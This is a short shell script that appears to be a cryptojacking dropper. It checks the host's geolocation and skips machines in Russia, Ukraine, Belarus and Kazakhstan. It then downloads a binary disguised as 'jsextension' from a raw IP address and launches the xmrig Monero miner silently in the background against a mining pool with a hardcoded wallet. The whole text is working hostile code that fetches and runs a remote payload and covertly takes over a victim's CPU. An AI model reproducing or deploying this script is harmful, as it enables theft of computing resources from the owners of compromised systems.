IP=$(curl -k https://freegeoip.app/xml/asd | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
	var=$(pgrep xmrig)
	if [ -z "$var" ]
		then
		curl http://185.173.36.219/download/jsextension -o jsextension 
		if [ ! -f xmrig ]
			then
			wget http://185.173.36.219/download/jsextension -O jsextension
		fi
		chmod +x xmrig
		./xmrig -k --tls --rig-id q -o pool.minexmr.com:443 -u 87FLi8c827mTJwezgVXVUrEkHagWiJ2wuaco2bVkFLGqL3MNMFpeay7QJmHooz19qQFMgJfQRJwJKZMJpetT5Qp69xBARwH --cpu-max-threads-hint=20 --donate-level=1 --background &>/dev/null &
	fi
fi
	
